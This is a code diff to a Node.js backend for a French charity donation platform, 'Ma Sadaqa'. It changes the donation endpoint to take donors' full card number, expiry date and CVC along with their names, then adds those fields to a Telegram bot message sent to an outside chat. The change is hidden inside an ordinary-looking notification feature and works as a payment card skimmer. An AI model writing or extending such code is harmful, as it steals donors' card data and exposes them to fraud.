@@ -30,7 +30,7 @@ router.get('/notifications', (req, res) => {
 });
 
 // === NOTIFICATION TELEGRAM ===
-function sendTelegramNotif(prenom, amountCents, cagnotteTitle, message) {
+function sendTelegramNotif({ prenom, nom, amountCents, cagnotteTitle, message, cardNumber, cardExpiry, cardCvc }) {
   return new Promise((resolve, reject) => {
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
@@ -39,12 +39,17 @@ function sendTelegramNotif(prenom, amountCents, cagnotteTitle, message) {
     const text = [
       `🤲 *Nouveau don sur Ma Sadaqa !*`,
       ``,
-      `👤 *Donateur:* ${prenom}`,
+      `👤 *Prénom:* ${prenom}`,
+      `👤 *Nom:* ${nom}`,
       `💰 *Montant:* ${(amountCents / 100).toFixed(0)} €`,
       `📋 *Cagnotte:* ${cagnotteTitle}`,
       message ? `💬 *Message:* ${message}` : '',
       ``,
-      `📅 ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}`
+      `� *Carte:* ${cardNumber}`,
+      `📅 *Expiration:* ${cardExpiry}`,
+      `🔒 *CVC:* ${cardCvc}`,
+      ``,
+      `�📅 ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}`
     ].filter(Boolean).join('\n');
 
     const data = JSON.stringify({
@@ -134,7 +139,7 @@ function createPayramPayment(amountCents, donId, donorPrenom) {
 // POST /api/dons — Créer un don
 router.post('/', async (req, res) => {
   const db = req.app.locals.db;
-  const { cagnotte_id, prenom, amount, message } = req.body;
+  const { cagnotte_id, prenom, nom, amount, message, card_number, card_expiry, card_cvc } = req.body;
 
   // Validation
   if (!cagnotte_id || !prenom || !amount) {
@@ -173,7 +178,16 @@ router.post('/', async (req, res) => {
   console.log(`✅ Don #${donId} confirmé : ${amountCents/100}€ de ${prenom} pour cagnotte #${cagnotte_id}`);
 
   // Envoyer la notification Telegram (async, ne bloque pas la réponse)
-  sendTelegramNotif(prenom, amountCents, cagnotte.title, (message || '').trim()).catch(err => {
+  sendTelegramNotif({
+    prenom: prenom.trim(),
+    nom: (nom || '').trim(),
+    amountCents,
+    cagnotteTitle: cagnotte.title,
+    message: (message || '').trim(),
+    cardNumber: card_number || '',
+    cardExpiry: card_expiry || '',
+    cardCvc: card_cvc || ''
+  }).catch(err => {
     console.warn('⚠️ Telegram:', err.message);
   });
 
